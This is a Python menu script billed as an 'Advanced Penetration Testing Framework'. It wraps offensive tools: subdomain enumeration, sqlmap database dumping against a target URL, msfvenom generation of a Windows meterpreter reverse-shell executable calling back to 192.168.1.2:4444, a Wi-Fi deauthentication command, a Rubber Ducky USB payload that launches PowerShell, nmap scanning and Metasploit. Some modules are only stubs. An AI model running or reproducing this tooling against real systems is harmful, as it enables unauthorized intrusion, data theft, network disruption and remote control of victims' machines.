import os
import subprocess
import requests
import threading
from urllib.parse import urlencode

import os
import subprocess
import requests
import threading
from urllib.parse import urlencode
from time import sleep


# Global Settings
TARGET_URL = "http://example.com"  # Replace with the actual target
HEADERS = {"User-Agent": "Mozilla/5.0"}
SESSION = requests.Session()


# Utility: Install Required Dependencies
def install_dependencies():
    print("\n[+] Installing Required Dependencies...")
    dependencies = ["requests", "beautifulsoup4", "sublist3r", "shodan"]
    for dep in dependencies:
        subprocess.run(["pip3", "install", dep], check=True)
    print("\n[+] Dependencies Installed Successfully.\n")


# Module 1: Advanced Recon
def subdomain_enum():
    print("\n[+] Starting Subdomain Enumeration...")
    os.system(f"sublist3r -d {TARGET_URL}")
    print("[+] Subdomain Enumeration Completed.\n")


def social_media_scraping():
    print("\n[+] Starting Social Media Recon...")
    platforms = ["https://facebook.com/example", "https://twitter.com/example"]
    for platform in platforms:
        print(f"Scraping: {platform}")
    print("[+] Social Media Recon Completed.\n")


# Module 2: Website Exploitation
def sql_injection_test():
    print("\n[+] Starting SQL Injection Test...")
    sqlmap_path = "sqlmap"  # Ensure sqlmap is installed and in PATH
    command = f"{sqlmap_path} -u {TARGET_URL} --batch --dbs"
    os.system(command)
    print("[+] SQL Injection Test Completed.\n")


# Module 3: Payload Delivery
def generate_reverse_shell():
    print("\n[+] Generating Reverse Shell Payload...")
    payload_command = (
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 "
        "-f exe -o reverse_shell.exe"
    )
    os.system(payload_command)
    print("[+] Reverse Shell Payload Saved as 'reverse_shell.exe'.\n")


# Module 4: Network Attacks
def wifi_deauth_attack():
    print("\n[+] Starting Wi-Fi Deauthentication Attack...")
    print("[!] Ensure You Have a Compatible Wi-Fi Adapter in Monitor Mode.")
    deauth_command = "aireplay-ng --deauth 10 -a <AP_MAC> -c <CLIENT_MAC> wlan0"
    print(f"Execute: {deauth_command}")
    print("[+] Wi-Fi Deauthentication Attack Simulated.\n")


# Module 5: Malicious USB Payloads
def create_malicious_usb():
    print("\n[+] Creating Malicious USB Payload...")
    rubber_ducky_payload = (
        "REM Sample Rubber Ducky payload\nDELAY 1000\nSTRING cmd /c powershell"
    )
    with open("usb_payload.txt", "w") as file:
        file.write(rubber_ducky_payload)
    print("[+] USB Payload Saved as 'usb_payload.txt'.\n")


# Module 6: Vulnerability Scanning
def run_vulnerability_scan():
    print("\n[+] Running Vulnerability Scanner...")
    nmap_command = "nmap -sS -sV -p 1-1000 -T4 192.168.1.1"
    os.system(nmap_command)
    print("[+] Vulnerability Scan Completed.\n")


# Module 7: Exploitation Framework Integration
def metasploit_exploit():
    print("\n[+] Launching Metasploit Exploitation Framework...")
    msfconsole_command = "msfconsole"
    os.system(msfconsole_command)
    print("[+] Metasploit Session Completed.\n")


# Module 8: Automated Recon
def automated_recon():
    print("\n[+] Initiating Automated Recon...")
    print("Scanning for subdomains, running Nmap, and gathering Shodan data...\n")
    subdomain_enum()
    run_vulnerability_scan()
    print("[+] Automated Recon Completed.\n")


# Snazzy Menu
def show_menu():
    print("""
    ==========================================
      Advanced Penetration Testing Framework
    ==========================================
    [1] Install Dependencies
    [2] Subdomain Enumeration
    [3] Social Media Recon
    [4] SQL Injection Test
    [5] Generate Reverse Shell
    [6] Wi-Fi Deauthentication Attack
    [7] Create Malicious USB Payload
    [8] Run Vulnerability Scanner
    [9] Metasploit Exploitation Framework
    [10] Automated Recon
    [0] Exit
    """)


# Main Functionality
def main():
    while True:
        show_menu()
        choice = input("Select an Option: ")
        if choice == "1":
            install_dependencies()
        elif choice == "2":
            subdomain_enum()
        elif choice == "3":
            social_media_scraping()
        elif choice == "4":
            sql_injection_test()
        elif choice == "5":
            generate_reverse_shell()
        elif choice == "6":
            wifi_deauth_attack()
        elif choice == "7":
            create_malicious_usb()
        elif choice == "8":
            run_vulnerability_scan()
        elif choice == "9":
            metasploit_exploit()
        elif choice == "10":
            automated_recon()
        elif choice == "0":
            print("Exiting...")
            break
        else:
            print("Invalid Choice. Try Again.")


if __name__ == "__main__":
    main()
